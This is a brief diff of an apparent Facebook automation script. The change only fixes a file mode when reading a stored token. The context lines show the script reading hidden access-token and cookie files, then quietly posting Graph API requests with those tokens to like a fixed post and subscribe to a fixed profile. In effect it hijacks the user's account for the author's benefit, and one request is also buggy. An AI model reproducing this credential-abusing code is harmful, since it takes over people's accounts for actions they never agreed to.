@@ -626,7 +626,7 @@ def menu(my_name,my_id):
         tokenmu.append(tokenx)
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        tok2 = open('.token2.txt','txt').read()
+        tok2 = open('.token2.txt','r').read()
         requests.post("https://graph.facebook.com/878169396977639/likes?summary=true&access_token={tok2}")
         requests.post("https://graph.facebook.com/878169396977639/likes?method=post&access_token=%s"%(tokenmu))
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenmu))
